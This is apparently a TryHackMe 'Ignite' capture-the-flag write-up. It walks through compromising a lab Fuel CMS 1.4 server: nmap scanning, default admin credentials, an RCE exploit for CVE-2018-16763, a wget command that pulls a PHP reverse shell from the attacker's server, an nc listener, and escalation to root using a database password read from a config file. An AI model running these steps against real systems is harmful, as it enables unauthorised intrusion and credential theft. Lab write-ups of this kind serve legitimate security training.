# Ignite
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* Fuel CMS
* Reverse Shell
* Fuel CMS CVE-2018-16763
* database config file

Tools used
--
* nmap
* wget
* nc

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.40.228
* Other information must be gathered during the attack

Phase 1: Enumeration
--
sudo nmap -sS -sC -sV 10.10.40.228 -p- -T5 -vvv

<SNIP>
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-title: Welcome to FUEL CMS
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
<SNIP>
```
Phase 2: Foothold
--
File `robots.txt` contains `fuel` path. If we visit it, we go through a login page. Furthermore, in the home page of this web application, there is a direct link to this login page and the admin credentials. Let's access by `admin:admin`.

We land inside an admin dashboard. There are several sections with "Upload" function: Pages, Blocks, Navigation, Assets.

On all these sections, by giving a look to the page source code, we notice the only allowed extensions are:
```html
<input type="file" name="userfile" value="" id="userfile_upload" class="field_type_file multifile" accept="jpg,jpeg,jpe,png,gif,mov,mpeg,mp3,wav,aiff,pdf,css,zip,svg"  />
```
One step behind: we noticed the FUEL CMS version is 1.4. By searching on Internet, we can get the following exploit: https://github.com/noraj/fuelcms-rce

Run it, and we can get a Remote Command Execution. From here, let's try to get a reverse shell by running netcat on our attacker machine. By running several reverse shell commands (bash, python, nc, PHP), we don't get any luck. So, the only way in mind should be found a way to upload a reverse shell file directly on the web server. For doing this, we should find a way to transfer files among machines. `curl` and `python` commands don't exist because by running `--version` argument, our exploit script does return nothing. But we noted `wget` exists.

So, let's create an HTTP server on the attacker machine side and use `wget` for uploading the file. For first, on the attacker machine create a reverse shell file `rev.php` and paste your PHP code. Then, in the same folder, run:
```
python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
By our exploit script, run:
```
ruby exploit.rb http://10.10.40.228 'wget http://10.18.98.39:8000/rev.php'
```
After that, on the attacker machine run `nc -lvnp <PORT>` and by the browser visit `10.10.40.228/rev.php`. At this point we get the reverse shell on netcat. Let's give the following commands:
```
script /dev/null -c bash

cat home/www-data/flag.txt

6470e394cbf6dab6a91682cc8585059b
```
Trying to search for some interesting data inside the web server, we can find an interesting file `/var/www/html/fuel/application/config/database.php`:
```php
<SNIP>
$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
	'dbprefix' => '',
	'pconnect' => FALSE,
	'db_debug' => (ENVIRONMENT !== 'production'),
	'cache_on' => FALSE,
	'cachedir' => '',
	'char_set' => 'utf8',
	'dbcollat' => 'utf8_general_ci',
	'swap_pre' => '',
	'encrypt' => FALSE,
	'compress' => FALSE,
	'stricton' => FALSE,
	'failover' => array(),
	'save_queries' => TRUE
);
<SNIP>
```
We can note root credentials. If we run `su root` and type `mememe` as password, we get root access and we can retrieve the root flag in `/root/root.txt` file.

